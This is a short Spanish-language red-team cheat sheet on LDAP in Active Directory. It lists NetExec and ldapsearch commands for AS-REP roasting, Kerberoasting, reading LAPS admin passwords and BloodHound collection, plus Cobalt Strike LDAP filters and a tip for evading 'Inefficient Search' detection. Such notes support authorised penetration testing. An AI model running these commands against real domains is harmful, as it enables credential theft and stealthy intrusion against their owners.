---
tags: [ports, ldap, ad]
status: done
---

# 389/636/3268/3269 — LDAP

| Puerto | Uso |
|--------|-----|
| 389 | LDAP estándar |
| 636 | LDAPS (TLS) |
| 3268 | Global Catalog LDAP |
| 3269 | Global Catalog LDAPS |

---

## Enumeración Básica

```bash
# NXC
nxc ldap <IP> -u '' -p '' --users
nxc ldap <IP> -u '' -p '' --asreproast output.txt
nxc ldap <IP> -u '' -p '' --kerberoasting output.txt

# ldapsearch
ldapsearch -x -H ldap://<IP> -b "dc=dominio,dc=com" "(objectClass=person)"

# Con credenciales
ldapsearch -v -x -D usuario@dominio.com -w contraseña -b "DC=dominio,DC=com" -h <IP> "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

# BloodHound via NXC
nxc ldap <IP> -u 'usuario' -p 'contraseña' --bloodhound -c All -d dominio.com --dns-server <IP>

# LAPS — leer contraseña admin local
nxc ldap <IP> -d "dominio.com" -u "usuario" -p "contraseña" --module laps
```

---

## Filtros LDAP Útiles (Cobalt Strike / ADSearch)

```bash
# Todos los usuarios
(samAccountType=805306368)

# Usuarios admin
(&(samAccountType=805306368)(adminCount=1))

# Usuarios con SPN (Kerberoastables)
(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))

# Equipos con Unconstrained Delegation
(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))

# Membresía en grupo (incluyendo anidamiento)
(memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=dominio,DC=com)
```

> [!tip] OPSEC en LDAP
> Evitar filtros excesivos que visiten miles de objetos pero devuelvan <10% → detección por "Inefficient Search".
> Mejor consulta amplia con atributos limitados: `samaccounttype,distinguishedname,objectsid,ntsecuritydescriptor`

